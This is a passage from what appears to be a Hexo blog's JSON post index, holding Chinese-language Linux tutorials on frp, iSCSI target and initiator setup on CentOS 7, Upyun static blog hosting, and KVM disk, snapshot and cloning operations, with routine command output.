/usr/local/frp/frps -c /usr/local/frp/frps.ini May 11 14:20:42 ALIYUN-64 systemd[1]: Started frp server. May 11 14:20:42 ALIYUN-64 systemd[1]: Starting frp server... May 11 14:20:42 ALIYUN-64 frps[3399]: 2017/05/11 14:20:42 [main.go:194] [I] Start frps success May 11 14:20:42 ALIYUN-64 frps[3399]: 2017/05/11 14:20:42 [main.go:196] [I] PrivilegeMode is enabled, you shoul...issues Hint: Some lines were ellipsized, use -l to show in full.","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"centos7 使用 iscsi 网络存储服务","slug":"centos7-使用-iscsi-网络存储服务","date":"2017-06-15T05:02:50.000Z","updated":"2021-02-26T06:05:29.271Z","comments":true,"path":"posts/3667419870.html","link":"","permalink":"https://awen.me/posts/3667419870.html","excerpt":"安装yum -y installtargetcli开启","text":"安装yum -y installtargetcli开启 [root@server ~]# systemctl enable target.service Created symlink from /etc/systemd/system/multi-user.target.wants/target.service to /usr/lib/systemd/system/target.service. [root@server ~]# systemctl start target.service 配置服务端1.进入配置接口 [root@server ~]# targetcli Warning: Could not load preferences file /root/.targetcli/prefs.bin. targetcli shell version 2.1.fb41 Copyright 2011-2013 by Datera, Inc and others. For help on commands, type &apos;help&apos;.2.查看帮助信息 /&gt; help GENERALITIES ============ This is a shell in which you can create, delete and configure configuration objects. The available commands depend on the current path or target path you want to run a command in: different path have different sets of available commands, i.e. a path pointing at an iscsi target will not have the same availaible commands as, say, a path pointing at a storage object. The prompt that starts each command line indicates your current path. Alternatively (useful if the prompt displays an abbreviated path to save space), you can run the pwd command to display the complete current path. Navigating the tree is done using the cd command. Without any argument, cd will present you wil the full objects tree. Just use arrows to select the destination path, and enter will get you there. Please try help cd for navigation tips. COMMAND SYNTAX ============== Commands are built using the following syntax: [TARGET_PATH] COMMAND_NAME [OPTIONS] The TARGET_PATH indicates the path to run the command from. If ommited, the command will be run from your current path. The OPTIONS depend on the command. Please use help COMMAND to get more information. AVAILABLE COMMANDS ================== The following commands are available in the current path: - bookmarks action [bookmark] - cd [path] - clearconfig [confirm] - exit - get [group] [parameter...] - help [topic] - ls [path] [depth] - pwd - refresh - restoreconfig [savefile] [clear_existing] - saveconfig [savefile] - sessions [action] [sid] - set [group] [parameter=value...] - status - version 4.查看目录 /&gt; ls o- / ......................................................................................................................... [...] o- backstores .............................................................................................................. [...] | o- block .................................................................................................. [Storage Objects: 0] | o- fileio ................................................................................................. [Storage Objects: 0] | o- pscsi .................................................................................................. [Storage Objects: 0] | o- ramdisk ................................................................................................ [Storage Objects: 0] o- iscsi ............................................................................................................ [Targets: 0] o- loopback ......................................................................................................... [Targets: 0]5.添加硬盘 /&gt; backstores/block create Datastore /dev/sdb Created block storage object Datastore using /dev/sdb.6.建立一个名称 IQN /&gt; /iscsi create iqn.2017-05.com.v5linux.iscsi.server0 Created target iqn.2017-05.com.v5linux.iscsi.server0. Created TPG 1. Global pref auto_add_default_portal=true Created default portal listening on all IPs (0.0.0.0), port 3260. /&gt; ls o- / ......................................................................................................................... [...] o- backstores .............................................................................................................. [...] | o- block .................................................................................................. [Storage Objects: 1] | | o- Datastore ..................................................................... [/dev/sdb (20.0GiB) write-thru deactivated] | o- fileio ................................................................................................. [Storage Objects: 0] | o- pscsi .................................................................................................. [Storage Objects: 0] | o- ramdisk ................................................................................................ [Storage Objects: 0] o- iscsi ............................................................................................................ [Targets: 1] | o- iqn.2017-05.com.v5linux.iscsi.server0 ............................................................................. [TPGs: 1] | o- tpg1 ............................................................................................... [no-gen-acls, no-auth] | o- acls .......................................................................................................... [ACLs: 0] | o- luns .......................................................................................................... [LUNs: 0] | o- portals .................................................................................................... [Portals: 1] | o- 0.0.0.0:3260 ..................................................................................................... [OK] o- loopback ......................................................................................................... [Targets: 0] /&gt; 配置监听端口 默认监听的端口是2160，监听地址是任何地址 /&gt; cd /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/ /iscsi/iqn.20...iscsi.server0&gt; ls o- iqn.2017-05.com.v5linux.iscsi.server0 ................................................................................. [TPGs: 1] o- tpg1 ................................................................................................... [no-gen-acls, no-auth] o- acls .............................................................................................................. [ACLs: 0] o- luns .............................................................................................................. [LUNs: 0] o- portals ........................................................................................................ [Portals: 1] o- 0.0.0.0:3260 ......................................................................................................... [OK] /iscsi/iqn.20...iscsi.server0&gt; 配置提示不能创建网络配置，需要先删除默认的0。0.0.0 /&gt; /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/portals create 172.10.100.129 ip_port=3260 Using default IP port 3260 Could not create NetworkPortal in configFS 进入到/iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/portals 目录 /iscsi/iqn.20.../tpg1/portals&gt; delete 0.0.0.0 3260 #删除 ip 和端口 Deleted network portal 0.0.0.0:3260 /iscsi/iqn.20.../tpg1/portals&gt; ls o- portals ............................................................................................................ [Portals: 0] /iscsi/iqn.20.../tpg1/portals&gt; /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/portals create 172.10.100.129 ip_port=3260 Using default IP port 3260 #添加 ip 和端口 Created network portal 172.10.100.129:3260. /iscsi/iqn.20.../tpg1/portals&gt; ls o- portals ............................................................................................................ [Portals: 1] o- 172.10.100.129:3260 ...................................................................................................... [OK]创建一个 acl /iscsi/iqn.20.../tpg1/portals&gt; /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/acls create iqn.2017-05.com.v5linux.iscsi.desktop Created Node ACL for iqn.2017-05.com.v5linux.iscsi.desktop iqn.2017-05.com.v5linux.iscsi.desktop 表示客户端，这个后面会用到，名称任意 创建一个 lun （target 块设备的逻辑单元） /iscsi/iqn.20.../tpg1/portals&gt; /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/acls create iqn.2017-05.com.v5linux.iscsi.desktop Created Node ACL for iqn.2017-05.com.v5linux.iscsi.desktop /iscsi/iqn.20.../tpg1/portals&gt; /iscsi/iqn.2017-05.com.v5linux.iscsi.server0/tpg1/luns create /backstores/block/Datastore Created LUN 0. Created LUN 0-&gt;0 mapping in node ACL iqn.2017-05.com.v5linux.iscsi.desktop 确认配置保存 /iscsi/iqn.20.../tpg1/portals&gt; cd / /&gt; saveconfig Last 10 configs saved in /etc/target/backup. Configuration saved to /etc/target/saveconfig.json /&gt; 再次查看整个目录结构 /&gt; ls o- / ......................................................................................................................... [...] o- backstores .............................................................................................................. [...] | o- block .................................................................................................. [Storage Objects: 1] | | o- Datastore ....................................................................... [/dev/sdb (20.0GiB) write-thru activated] | o- fileio ................................................................................................. [Storage Objects: 0] | o- pscsi .................................................................................................. [Storage Objects: 0] | o- ramdisk ................................................................................................ [Storage Objects: 0] o- iscsi ............................................................................................................ [Targets: 1] | o- iqn.2017-05.com.v5linux.iscsi.server0 ............................................................................. [TPGs: 1] | o- tpg1 ............................................................................................... [no-gen-acls, no-auth] | o- acls .......................................................................................................... [ACLs: 1] | | o- iqn.2017-05.com.v5linux.iscsi.desktop ................................................................ [Mapped LUNs: 1] | | o- mapped_lun0 ............................................................................. [lun0 block/Datastore (rw)] | o- luns .......................................................................................................... [LUNs: 1] | | o- lun0 ..................................................................................... [block/Datastore (/dev/sdb)] | o- portals .................................................................................................... [Portals: 1] | o- 172.10.100.129:3260 .............................................................................................. [OK] o- loopback ............... 退出 /&gt; exit Global pref auto_save_on_exit=true Last 10 configs saved in /etc/target/backup. Configuration saved to /etc/target/saveconfig.json客户端1.安装并且启动 [root@client ~]# yum -y install iscsi-initiator-utils Loaded plugins: fastestmirror, langpacks Loading mirror speeds from cached hostfile * base: mirrors.163.com * extras: mirrors.163.com * updates: mirrors.zju.edu.cn Package iscsi-initiator-utils-6.2.0.873-35.el7.x86_64 already installed and latest version Nothing to do [root@client ~]# systemctl start iscsid.service2.配置InitiatorName [root@client ~]# cat /etc/iscsi/initiatorname.iscsi InitiatorName=iqn.1994-05.com.redhat:60b98a424980 [root@client ~]# echo InitiatorName=iqn.2017-05.com.v5linux.iscsi.desktop &gt; /etc/iscsi/initiatorname.iscsi #注意自己的主机名一定要与 server 的 acl 匹配 [root@client ~]# cat /etc/iscsi/initiatorname.iscsi InitiatorName=iqn.2017-05.com.v5linux.iscsi.desktop3.查找服务端 [root@client ~]# iscsiadm -m discovery -t st -p 172.10.100.129 172.10.100.129:3260,1 iqn.2017-05.com.v5linux.iscsi.server0参数 -m discovery 表示发现查找-t senbtargets 表示发布的 target （缩写为-t st） -p 指定 ip 和端口 ip:port 4.重启服务 [root@client ~]# systemctl restart iscsid.service 5.连接 [root@client ~]# iscsiadm -m node -T iqn.2017-05.com.v5linux.iscsi.server0 -l Logging in to [iface: default, target: iqn.2017-05.com.v5linux.iscsi.server0, portal: 172.10.100.129,3260] (multiple) Login to [iface: default, target: iqn.2017-05.com.v5linux.iscsi.server0, portal: 172.10.100.129,3260] successful.6.查看磁盘 [root@client ~]# fdisk -l Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x0000f054 Device Boot Start End Blocks Id System /dev/sda1 * 2048 2099199 1048576 83 Linux /dev/sda2 2099200 41943039 19921920 8e Linux LVM Disk /dev/mapper/cl-root: 18.2 GB, 18249416704 bytes, 35643392 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2147 MB, 2147483648 bytes, 4194304 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/sdc: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 4194304 bytes排错1.提示no route 确认防火墙端口是否开启，确认网段是否一致","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"又拍云存储加速 hexo博客方案","slug":"又拍云存储加速-hexo博客方案","date":"2017-06-14T12:42:41.000Z","updated":"2021-02-26T06:05:29.320Z","comments":true,"path":"posts/1411560064.html","link":"","permalink":"https://awen.me/posts/1411560064.html","excerpt":"哈喽，各位小伙伴，今天我给大家带来的分享是，如何在不用购买服务器的情况下搭建一个属于自己的技术博客呢？ 大多数情况下，要想搭建自己的一个博客系统，我们常用的有 WordPress, typecho 等等，但是这些博客搭建完都需要一些最基本的设备或服务，我们来看一下：","text":"哈喽，各位小伙伴，今天我给大家带来的分享是，如何在不用购买服务器的情况下搭建一个属于自己的技术博客呢？ 大多数情况下，要想搭建自己的一个博客系统，我们常用的有 WordPress, typecho 等等，但是这些博客搭建完都需要一些最基本的设备或服务，我们来看一下： 一台至少1核心1G 的服务器，这个花费至少一年四五百，就算阿里云最近做活动三年也要 800 多，最低配置哦。 搭建 linux + MySQL + php 程序，跑完这个程序，可用内存最多就不到100M 啦 安装WordPress 或 typecho 等博客软件 需要一个域名，如果在国内，你还要备案哦 如果说你的服务器是放在电信啊 联通这些运营商，别的地方的小伙伴访问你的网站可能还会卡卡卡的，怎么办？ Wordpress typecho 这些需要和数据库进行交互的程序需要耗费不少系统内存+ CPU 资源 比如我在阿里云一开始跑的是WordPress 后来觉得这货太庞大了，转到轻量级的 typecho，可是还是出现资源不足，报 502 的错误，没办法，预算有限，我要加内存，一年得千把块钱呀！那有没有更可靠的方案呢？答案是肯定的啦！ 我现在的博客就是采用hexo+又拍云存储的方式进行托管的。hexo是一款免费的开源的 nodejs 博客框架，具体怎么搭建，你可以看这篇文章 https://awen.me/2017/06/12/cj3xspcc9004cdisy8gd1m3zy.html 然后，把编译好的文件放在又拍云就可以啦，当然你的域名是需要备案的。因为国内大环境就是这样，这个也是没有办法的，怎么样，是不是蠢蠢欲动，那么我简单说下步骤 第一步，注册又拍云账号，你可以点击这里https://console.upyun.com/register/?invite=ryUraiRGW 进行注册，专属链接，有优惠哦！ 第二步，看视频进行配置http://docs.upyun.com/faq/#cdn，主要是看如何创建和使用又拍云存储创建和使用CDN存储服务 第三步，如果你认真看完了第二步的视频，那么你肯定会把本地资源传到存储了，绑定你的域名进行访问吧！ 第四步，默认是 http 方式访问的，目前国内劫持比较多， 可以试试又拍云的免费 ssl 证书哦，不会申请没关系，看看这个视频吧！设置ssl证书,申请Let’s encrypt证书是可以免费续签的，永远不会过期，只要你的解析不乱改。 好了，到这里，你的博客基本就建好了。由于又拍云 CDN 默认就是全网加速的，国内国外都访问速度很快，你可以拿我的博客去17ce 去进行测试看全国各个节点的访问速度如何哦。","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"KVM 虚拟化技术之 扩充磁盘","slug":"KVM-虚拟化技术之-扩充磁盘","date":"2017-06-14T12:06:37.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/3884812938.html","link":"","permalink":"https://awen.me/posts/3884812938.html","excerpt":"创建一块新磁盘[root@kvm images]# qemu-img create -f qcow2 vm1-disk.qcow2 2G Formatting &apos;vm1-disk1&apos;, fmt=qcow2 size=2147483648 encryption=off cluster_size=65536 [root@kvm images]# ls vm1-disk.qcow2 vm1.img vm1.qcow2 vm2.img编辑配置文件[root@kvm images]# virsh edit vm1","text":"创建一块新磁盘[root@kvm images]# qemu-img create -f qcow2 vm1-disk.qcow2 2G Formatting &apos;vm1-disk1&apos;, fmt=qcow2 size=2147483648 encryption=off cluster_size=65536 [root@kvm images]# ls vm1-disk.qcow2 vm1.img vm1.qcow2 vm2.img编辑配置文件[root@kvm images]# virsh edit vm1 增加 &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos; cache=&apos;none&apos;/&gt; &lt;source file=&apos;/home/kvm/images/vm1-disk.qcow2&apos;/&gt; &lt;target dev=&apos;hdb&apos; bus=&apos;ide&apos;/&gt; &lt;/disk&gt;然后 启动vm1 实例 [root@kvm images]# virsh start vm1 Domain vm1 started连接虚拟机，查看磁盘 [root@vm1 ~]# fdisk -l Disk /dev/sda: 10.7 GB, 10737418240 bytes 255 heads, 63 sectors/track, 1305 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x000aaa7c Device Boot Start End Blocks Id System /dev/sda1 * 1 64 512000 83 Linux Partition 1 does not end on cylinder boundary. /dev/sda2 64 1306 9972736 8e Linux LVM Disk /dev/sdb: 2147 MB, 2147483648 bytes 255 heads, 63 sectors/track, 261 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00000000 Disk /dev/mapper/vg_vm1-lv_root: 9135 MB, 9135194112 bytes 255 heads, 63 sectors/track, 1110 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00000000 Disk /dev/mapper/vg_vm1-lv_swap: 1073 MB, 1073741824 bytes 255 heads, 63 sectors/track, 130 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00000000然后挂载磁盘什么的就不用多说了。","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"\tKVM 虚拟化技术（八） 之快照","slug":"KVM-虚拟化技术（八）-之快照","date":"2017-06-14T12:05:50.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/3564167111.html","link":"","permalink":"https://awen.me/posts/3564167111.html","excerpt":"kvm虚拟机默认使用raw格式的镜像格式，性能最好，速度最快，它的缺点就是不支持一些新的功能，如支持镜像,zlib磁盘压缩,AES加密等。要使用镜像功能，磁盘格式必须为qcow2。 ##查看磁盘格式 [root@kvm images]# qemu-img info vm1.img image: vm1.img file format: raw virtual size: 10G (10737418240 bytes) disk size: 1.4G","text":"kvm虚拟机默认使用raw格式的镜像格式，性能最好，速度最快，它的缺点就是不支持一些新的功能，如支持镜像,zlib磁盘压缩,AES加密等。要使用镜像功能，磁盘格式必须为qcow2。 ##查看磁盘格式 [root@kvm images]# qemu-img info vm1.img image: vm1.img file format: raw virtual size: 10G (10737418240 bytes) disk size: 1.4G 转换格式[root@kvm images]# qemu-img convert -f raw -O qcow2 vm1.img vm1.qcow2 root@kvm images]# ls vm1.img vm1.qcow2 vm2.img [root@kvm images]# qemu-img info vm1.qcow2 image: vm1.qcow2 file format: qcow2 virtual size: 10G (10737418240 bytes) disk size: 1.2G cluster_size: 65536修改配置文件[root@kvm images]# virsh edit vm1修改 &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos; cache=&apos;none&apos;/&gt; &lt;source file=&apos;/home/kvm/images/vm1.qcow2&apos;/&gt; &lt;target dev=&apos;hda&apos; bus=&apos;ide&apos;/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;0&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt;创建快照与快照相关的命令 Snapshot (help keyword &apos;snapshot&apos;) snapshot-create Create a snapshot from XML snapshot-create-as Create a snapshot from a set of args snapshot-current Get or set the current snapshot snapshot-delete Delete a domain snapshot snapshot-dumpxml Dump XML for a domain snapshot snapshot-edit edit XML for a snapshot snapshot-info snapshot information snapshot-list List snapshots for a domain snapshot-parent Get the name of the parent of a snapshot snapshot-revert Revert a domain to a snapshot开始 [root@kvm images]# virsh snapshot-create vm1 Domain snapshot 1489950406 created [root@kvm images]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff查看快照 [root@kvm images]# virsh snapshot-current vm1 &lt;domainsnapshot&gt; &lt;name&gt;1489950406&lt;/name&gt; &lt;state&gt;shutoff&lt;/state&gt; &lt;creationTime&gt;1489950406&lt;/creationTime&gt; &lt;memory snapshot=&apos;no&apos;/&gt; &lt;disks&gt; &lt;disk name=&apos;hda&apos; snapshot=&apos;internal&apos;/&gt; &lt;disk name=&apos;hdc&apos; snapshot=&apos;no&apos;/&gt; &lt;/disks&gt; &lt;domain type=&apos;kvm&apos;&gt; &lt;name&gt;vm1&lt;/name&gt; &lt;uuid&gt;686c7566-e44d-6ab2-e98f-246e012fa39f&lt;/uuid&gt; &lt;memory unit=&apos;KiB&apos;&gt;1048576&lt;/memory&gt; &lt;currentMemory unit=&apos;KiB&apos;&gt;1048576&lt;/currentMemory&gt; &lt;vcpu placement=&apos;static&apos;&gt;2&lt;/vcpu&gt; &lt;os&gt; &lt;type arch=&apos;x86_64&apos; machine=&apos;rhel6.6.0&apos;&gt;hvm&lt;/type&gt; &lt;boot dev=&apos;hd&apos;/&gt; &lt;/os&gt; &lt;features&gt; &lt;acpi/&gt; &lt;apic/&gt; &lt;pae/&gt; &lt;/features&gt; &lt;clock offset=&apos;utc&apos;/&gt; &lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt; &lt;on_reboot&gt;restart&lt;/on_reboot&gt; &lt;on_crash&gt;restart&lt;/on_crash&gt; &lt;devices&gt; &lt;emulator&gt;/usr/libexec/qemu-kvm&lt;/emulator&gt; &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos; cache=&apos;none&apos;/&gt; &lt;source file=&apos;/home/kvm/images/vm1.qcow2&apos;/&gt; &lt;target dev=&apos;hda&apos; bus=&apos;ide&apos;/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;0&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt; &lt;disk type=&apos;block&apos; device=&apos;cdrom&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;raw&apos;/&gt; &lt;target dev=&apos;hdc&apos; bus=&apos;ide&apos;/&gt; &lt;readonly/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;1&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-ehci1&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x7&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci1&apos;&gt; &lt;master startport=&apos;0&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x0&apos; multifunction=&apos;on&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci2&apos;&gt; &lt;master startport=&apos;2&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci3&apos;&gt; &lt;master startport=&apos;4&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x2&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;ide&apos; index=&apos;0&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x01&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;interface type=&apos;bridge&apos;&gt; &lt;mac address=&apos;52:54:00:3a:37:22&apos;/&gt; &lt;source bridge=&apos;br0&apos;/&gt; &lt;model type=&apos;virtio&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x03&apos; function=&apos;0x0&apos;/&gt; &lt;/interface&gt; &lt;serial type=&apos;pty&apos;&gt; &lt;target port=&apos;0&apos;/&gt; &lt;/serial&gt; &lt;console type=&apos;pty&apos;&gt; &lt;target type=&apos;serial&apos; port=&apos;0&apos;/&gt; &lt;/console&gt; &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt; &lt;graphics type=&apos;vnc&apos; port=&apos;5910&apos; autoport=&apos;no&apos;/&gt; &lt;video&gt; &lt;model type=&apos;cirrus&apos; vram=&apos;9216&apos; heads=&apos;1&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x02&apos; function=&apos;0x0&apos;/&gt; &lt;/video&gt; &lt;memballoon model=&apos;virtio&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x0&apos;/&gt; &lt;/memballoon&gt; &lt;/devices&gt; &lt;/domain&gt; &lt;/domainsnapshot&gt;快照文件在 [root@kvm images]# cd /var/lib/libvirt/qemu/snapshot/vm1/1489950406.xml 恢复快照查看快照 [root@kvm ~]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff [root@kvm ~]# virsh snapshot-create vm1 Domain snapshot 1489951085 created [root@kvm ~]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff 1489951085 2017-03-20 03:18:05 +0800 shutoff恢复快照是通过快照的对应id来恢复的。比如我们希望将虚拟机恢复至 2017-03-20 03:06:46，则我们需要知道对应的name是1489950406 使用snapshot-revert 参数 跟上虚拟机名称 后面跟上name [root@kvm ~]# virsh snapshot-revert vm1 1489950406 [root@kvm ~]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff 1489951085 2017-03-20 03:18:05 +0800 shutoff [root@kvm ~]# virsh snapshot-current vm1 &lt;domainsnapshot&gt; &lt;name&gt;1489950406&lt;/name&gt; &lt;state&gt;shutoff&lt;/state&gt; &lt;creationTime&gt;1489950406&lt;/creationTime&gt; &lt;memory snapshot=&apos;no&apos;/&gt; &lt;disks&gt; &lt;disk name=&apos;hda&apos; snapshot=&apos;internal&apos;/&gt; &lt;disk name=&apos;hdc&apos; snapshot=&apos;no&apos;/&gt; &lt;/disks&gt; &lt;domain type=&apos;kvm&apos;&gt;删除快照[root@kvm ~]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff 1489951085 2017-03-20 03:18:05 +0800 shutoff [root@kvm ~]# virsh snapshot-delete vm1 1489951085 Domain snapshot 1489951085 deleted [root@kvm ~]# virsh snapshot-list vm1 Name Creation Time State ------------------------------------------------------------ 1489950406 2017-03-20 03:06:46 +0800 shutoff故障处理[root@kvm ~]# virsh shutdown vm1 error: Failed to shutdown domain vm1 error: Timed out during operation: cannot acquire state change lock [root@kvm ~]# [root@kvm ~]# [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- 14 vm2 running 15 vm1 paused [root@kvm ~]# virsh destroy vm1 Domain vm1 destroyed [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- 14 vm2 running - vm1 shut off","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM  虚拟化技术（七） 克隆虚拟机","slug":"KVM-虚拟化技术（七）-克隆虚拟机","date":"2017-06-14T12:05:18.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/3888592076.html","link":"","permalink":"https://awen.me/posts/3888592076.html","excerpt":"上一章中，我们创建了一个vm1虚拟机，虚拟机的配置文件在 [root@kvm ~]# cat /etc/libvirt/qemu/vm1.xml 克隆虚拟机克隆虚拟机必须先关闭虚拟机，查看虚拟机状态 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- - vm1 shut off","text":"上一章中，我们创建了一个vm1虚拟机，虚拟机的配置文件在 [root@kvm ~]# cat /etc/libvirt/qemu/vm1.xml 克隆虚拟机克隆虚拟机必须先关闭虚拟机，查看虚拟机状态 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- - vm1 shut off 开始克隆了，我们把vm1 虚拟机克隆一个叫vm2，其磁盘位置在/home/kvm/images/vm2 virt-clone -o vm1 -n vm2 -f /home/kvm/images/vm2.img [root@kvm ~]# virt-clone -o vm1 -n vm2 -f /home/kvm/images/vm2.img WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 3844 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 3844 M available) Allocating &apos;vm2.img&apos; | 10 GB 00:52 Clone &apos;vm2&apos; created successfully.3.然后查看虚拟机列表 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- - vm1 shut off - vm2 shut off4.我们启动虚拟机，并且通过console 连接， [root@kvm ~]# virsh console vm2 Connected to domain vm2 Escape character is ^] Welcome to CentOS Starting udev: G[ OK ] Setting hostname vm1: [ OK ] Setting up Logical Volume Management: 2 logical volume(s) in volume group &quot;vg_vm1&quot; now active [ OK ] Checking filesystems Checking all file systems. [/sbin/fsck.ext4 (1) -- /] fsck.ext4 -a /dev/mapper/vg_vm1-lv_root /dev/mapper/vg_vm1-lv_root: clean, 23060/558624 files, 267724/2230272 blocks [/sbin/fsck.ext4 (1) -- /boot] fsck.ext4 -a /dev/sda1 /dev/sda1: clean, 38/128016 files, 57869/512000 blocks [ OK ] Remounting root filesystem in read-write mode: [ OK ] Mounting local filesystems: [ OK ] Enabling /etc/fstab swaps: [ OK ] Entering non-interactive startup Starting monitoring for VG vg_vm1: 2 logical volume(s) in volume group &quot;vg_vm1&quot; monitored [ OK ] ip6tables: Applying firewall rules: [ OK ] iptables: Applying firewall rules: [ OK ] Bringing up loopback interface: [ OK ] Bringing up interface eth0: Device eth0 does not seem to be present, delaying initialization. [FAILED] Starting auditd: [ OK ] Starting system logger: [ OK ] Mounting filesystems: [ OK ] Retrigger failed udev events[ OK ] Adding udev persistent rules[ OK ] Starting kdump:[FAILED] Starting sshd: [ OK ] Starting postfix: [ OK ] Starting crond: [ OK ] CentOS release 6.8 (Final) Kernel 2.6.32-642.el6.x86_64 on an x86_64 vm1 login: root Password: Last login: Sun Mar 19 18:28:16 on ttyS0 [root@vm1 ~]# 6.查看网卡 [root@vm1 ~]# ifconfig lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 